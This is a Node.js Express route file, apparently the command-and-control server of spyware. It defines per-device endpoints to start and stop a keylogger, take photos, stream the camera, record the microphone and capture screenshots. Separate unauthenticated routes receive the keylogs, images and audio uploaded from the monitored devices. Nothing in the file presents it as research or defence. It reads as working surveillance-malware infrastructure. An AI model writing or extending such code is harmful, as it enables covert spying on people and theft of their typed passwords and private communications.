const express = require('express');
const router = express.Router();
const { body } = require('express-validator');
const surveillanceController = require('../controllers/surveillanceController');
const { auth } = require('../middleware/auth');
const { validate } = require('../middleware/validation');

// Keylogger routes
router.post('/:deviceId/keylogger/start', auth, surveillanceController.startKeylogger);
router.post('/:deviceId/keylogger/stop', auth, surveillanceController.stopKeylogger);
router.post('/:deviceId/keylogger/sync', surveillanceController.syncKeylogs);
router.get('/:deviceId/keylogger/logs', auth, surveillanceController.getKeylogs);

// Camera routes
router.post('/:deviceId/camera/photo', auth, surveillanceController.takePhoto);
router.post('/:deviceId/camera/photo/receive', surveillanceController.receivePhoto);
router.post('/:deviceId/camera/live/start', auth, surveillanceController.startLiveCamera);
router.post('/:deviceId/camera/live/stop', auth, surveillanceController.stopLiveCamera);

// Microphone routes
router.post('/:deviceId/microphone/start', auth, surveillanceController.startListening);
router.post('/:deviceId/microphone/stop', auth, surveillanceController.stopListening);
router.post('/:deviceId/microphone/audio/receive', surveillanceController.receiveAudio);

// Screenshot routes
router.post('/:deviceId/screenshot', auth, surveillanceController.takeScreenshot);
router.post('/:deviceId/screenshot/receive', surveillanceController.receiveScreenshot);

module.exports = router;
